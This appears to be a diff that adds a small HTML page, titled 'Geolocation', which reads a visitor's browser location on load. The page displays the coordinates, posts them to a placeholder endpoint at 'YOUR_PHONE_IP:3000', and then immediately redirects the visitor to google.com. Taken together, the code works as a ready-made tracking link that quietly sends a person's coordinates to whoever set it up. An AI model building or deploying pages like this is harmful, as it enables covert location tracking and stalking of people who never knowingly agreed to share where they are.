@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Geolocation</title>
+  </head>
+  <body>
+    <h1>HTML Geolocation</h1>
+    <p id="demo">Fetching location...</p>
+
+    <script>
+      const x = document.getElementById("demo");
+
+      window.addEventListener('load', getLocation);
+
+      function getLocation() {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(success, error);
+        } else {
+          x.innerHTML = "Geolocation is not supported.";
+        }
+      }
+
+      function success(position) {
+        const latitude = position.coords.latitude;
+        const longitude = position.coords.longitude;
+
+        x.innerHTML = `Latitude: ${latitude} <br> Longitude: ${longitude}`;
+
+        // Send to backend
+        fetch('http://YOUR_PHONE_IP:3000/your-endpoint', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ latitude, longitude })
+        })
+        .then(res => res.json())
+        .then(data => {
+          console.log('Saved:', data);
+          window.location.href = 'https://www.google.com';
+        })
+        .catch(err => {
+          console.error(err);
+          x.innerHTML = "Error sending data.";
+        });
+      }
+
+      function error() {
+        x.innerHTML = "Unable to get location.";
+      }
+    </script>
+  </body>
+</html>
